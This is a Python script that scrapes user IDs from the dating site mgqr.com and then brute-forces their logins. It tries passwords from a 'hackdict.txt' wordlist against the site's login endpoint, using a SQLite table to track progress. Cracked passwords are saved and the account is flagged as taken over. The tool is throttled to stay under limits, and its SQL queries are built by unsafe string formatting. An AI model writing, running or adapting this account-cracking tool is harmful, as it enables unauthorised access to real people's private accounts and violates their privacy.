import asyncio, aiohttp, logging, traceback
import re
from http.cookiejar import LWPCookieJar
import urllib.request
import sqlite3
import requests
import json
import bs4
import time
import sys
from typing import List
import unittest

logging.basicConfig(level=logging.DEBUG,
                    format='[%(asctime)s %(filename)20s:%(lineno)06d %(levelname)8s] %(message)s',
                    datefmt='%Y%m%d%H%M%S', filename="mgqr.log", filemode="a+")
_conn = sqlite3.connect("F:\\Store\\Sqlite3\\mgqr.sqlite3")


class HttpException(Exception):
    pass


class LogicException(Exception):
    pass


def execsql(sql, instance=None):
    global _conn
    logging.debug(sql)
    cursor = _conn.cursor()
    cursor.execute(sql)
    if cursor.rowcount >= 1:
        _conn.commit()
    rows = cursor.fetchall()
    if len(rows) > 0:
        columns = [_[0].lower() for _ in cursor.description]
        if instance:
            for idx, col in enumerate(columns):
                setattr(instance, "_" + col, rows[0][idx])
    if len(rows) > 0:
        return (columns, rows)
    else:
        return None


try:
    execsql(
        "create table t_userinfo (uid varchar(20), status varchar(3), lockflag varchar(1), secretid int, "
        "password varchar(10), checkflag varchar(1), sex varchar(1), accesstime varchar(14))")
except:
    pass


async def fetch(session, url):
    with aiohttp.Timeout(20):
        async with session.get(url) as response:
            return await response.read()


async def post(session, url, body):
    print(url, body)
    async with session.post(url, data=body) as response:
        return await response.read()


def getUserInfo():
    pass


class BaseDBC(object):
    _table_name = ""

    def __init__(self, **kwargs):
        for key in kwargs:
            setattr(self, "_" + key, kwargs[key])

    @classmethod
    def initialize(cls):
        cursor = _conn.cursor()
        cursor.execute("SELECT * FROM {} LIMIT 1".format(cls._table_name))
        cls._columns = [_[0] for _ in cursor.description]

    def insert(self, unique_colomns: List[str]):
        try:
            if self.duplicate(unique_colomns):
                return
            inscols = []
            for key in self._columns:
                if hasattr(self, "_" + key):
                    inscols.append((key, getattr(self, "_" + key)))
            execsql("insert into {} ({}) values({})".format(self._table_name, ",".join([_[0] for _ in inscols]),
                                                            ",".join(
                                                                ["'{}'".format(str(_[1])) for _ in inscols])))
        except Exception as e:
            raise e

    def duplicate(self, unique_colomns: List[str]):
        columns = []
        if not unique_colomns:
            raise Exception("unique_colomns must not be null")
        for col in unique_colomns:
            if hasattr(self, "_" + col):
                columns.append((col, getattr(self, "_" + col)))
            else:
                raise Exception("colomn {} must not be null".format(col))
        where = " and ".join(["{}='{}'".format(_[0], _[1]) for _ in columns])
        ret = execsql("select 1 from {} where {}".format(self._table_name, where))
        if ret:
            return True
        return False

    @classmethod
    def object(cls, columns: List[list]):
        tmp = []
        for _ in columns:
            if _[0] in cls._columns:
                tmp.append((_[0], _[1]))
            else:
                logging.error(cls._columns)
                raise Exception("{} not in where clause".format(_[0]))
        if not columns:
            where = ""
        else:
            where = "where " + " and ".join(["{}='{}'".format(i, j) for i, j in tmp])
        ret = execsql("select * from {} {}".format(cls._table_name, where))
        return ret

    def select(self, query_columns: List[str]):
        if not query_columns:
            raise Exception("query_columns must not be empty")
        if not type(query_columns) in (list, tuple):
            raise Exception("query_columns type must be in tupe, list")
        wherecolumn = []
        for column in query_columns:
            if hasattr(self, "_" + column) and column in self._columns:
                wherecolumn.append((column, getattr(self, "_" + column)))
        where = " and ".join(["{}='{}'".format(_[0], _[1]) for _ in wherecolumn]) if query_columns else "1=1"
        sql = "select * from {} where {}".format(self._table_name, where)
        return execsql(sql, self)

    def get(self, key: str):
        if hasattr(self, "_{}".format(key)):
            return getattr(self, "_{}".format(key))
        return None

    def update(self, unique_colomns: List[str]):
        updcols = []
        if not unique_colomns:
            raise Exception("unique_colomns must not be none")
        for key in self._columns:
            if hasattr(self, "_" + key) and not getattr(self, "_{}".format(key)) is None:
                updcols.append((key, getattr(self, "_" + key)))
            else:
                pass
        updstring = ",".join(["{}='{}'".format(key, value) for key, value in updcols])
        if hasattr(self, "_id"):
            where = "id = '{}'".format(self._id)
        else:
            where = " and ".join(["{}='{}'".format(column, getattr(self, "_" + column)) for column in unique_colomns])
        sql = "update {} set {} where {}".format(self._table_name, updstring, where)
        execsql(sql, )

    def set(self, columns):
        for i, j in columns:
            setattr(self, "_{}".format(i, ), j)


class UserInfo(BaseDBC):
    _table_name = "t_userinfo"


async def getUserList():
    for i in range(100):
        url = "http://www.mgqr.com/user/search.aspx?sex=0&ddl_StartAge=18" \
              "&ddl_EndAge=30&ddl_Province=%E6%B1%9F%E8%8B%8F&ddl_City=&ddl_Area=&order=hit&page={}".format(i)
        response = requests.get(url)
        soup = bs4.BeautifulSoup(response.text, "html.parser")
        for user_div in soup.findAll("div", {"class": "user_frame"}):
            span = user_div.find("span", {"class": "vip"})
            logging.debug(span)
            if not span is None:
                checkflag = "1"
            else:
                checkflag = "0"
            href = user_div.a.attrs['href']
            uid = re.search("(\d+)", href).group(1)
            name = user_div.findAll("a")[1].text
            userinfo = UserInfo(name=name, uid=uid, sex=0, status="999", secretid=0,
                                accesstime=time.strftime("%Y%m%d%H%M%S"), checkflag=checkflag)
            userinfo.insert(["uid"])


def logintest(uid: str, pwd: str):
    response = None
    try:
        cookie = LWPCookieJar()
        handler = urllib.request.HTTPCookieProcessor(cookie)
        opener = urllib.request.build_opener(handler)
        data = 'UserName={}&UserPwd={}&remember=1'.format(uid, pwd)
        req = urllib.request.Request(url='http://www.mgqr.com/control/checklogin.ashx',
                                     data=data.encode("utf8"))
        try:
            response = opener.open(req)
        except Exception as e:
            logging.error(str(e))
            raise HttpException("网络错误")
        text = response.read().decode('utf8')
        obj = json.loads(text, )
        logging.debug(text)
        if obj["userid"] == 0:
            raise LogicException("密码错")
        return obj
    finally:
        if response:
            response.close()


def test():
    d = dict(zip(['uid', 'status', 'lockflag', 'secretid', 'password', 'checkflag', 'sex', 'accesstime'],
                 ('4011247', '999', None, 0, None, '1', '1', '20160514170348')))
    print(d)
    userinfo = UserInfo(**d)
    userinfo.update(["uid"])
    print(UserInfo.object([["uid", "4011247"], ]))
    sys.exit(0)


def testDb():
    pass


def main():
    global runcount
    runtimesdict = {}
    tocheck = UserInfo.object([["checkflag", "1"], ["status", "999"]])
    if 1:
        for value in tocheck[1]:
            tmp = dict([(key, value[idx]) for idx, key in enumerate(tocheck[0])])
            userinfo = UserInfo(**tmp)
            userinfo.select(["uid"])
            runtimes = runtimesdict.get(userinfo.get("uid"), 0)
            if runtimes > 3:
                continue
            for j in range(3):
                try:
                    if userinfo.get("secretid") >= 1846:
                        break
                    logging.debug("{},{}".format(userinfo.get("secretid"), userinfo.get("status")))
                    runcount += 1
                    if runcount > 500:
                        sys.exit()
                    if runcount % 10 == 0:
                        time.sleep(1)
                    logging.debug("runcount={}".format(runcount))
                    logintest(userinfo.get("uid"), hacklist[userinfo.get("secretid")])
                    userinfo.set([["password", hacklist[userinfo.get("secretid")]], ["status", "099"]])
                    userinfo.update(["uid"])
                    break
                except LogicException as e:
                    userinfo.set([["secretid", int(userinfo.get("secretid")) + 1]])
                    userinfo.update(["uid"])
                    logging.debug(UserInfo.object([["uid", userinfo.get("uid")]]))
                except Exception as e:
                    raise e
                finally:
                    # pass
                    runtimesdict[int(userinfo.get("uid"))] = runtimes + 1
        pass


def test1():
    # execsql("update t_userinfo set secretid = 0")
    ret = UserInfo.object([["checkflag", "1"]])
    print(len(ret[1]))


if __name__ == "__main__":
    loop = asyncio.get_event_loop()
    hacklist = []
    with open("hackdict.txt") as fd:
        for _ in fd:
            tmp = _.strip()
            if tmp: hacklist.append(tmp)
    UserInfo.initialize()

    # loop.run_until_complete(getUserList())
    runcount = 0
    while 1:
        main()
    # test1()
    loop.run_forever()
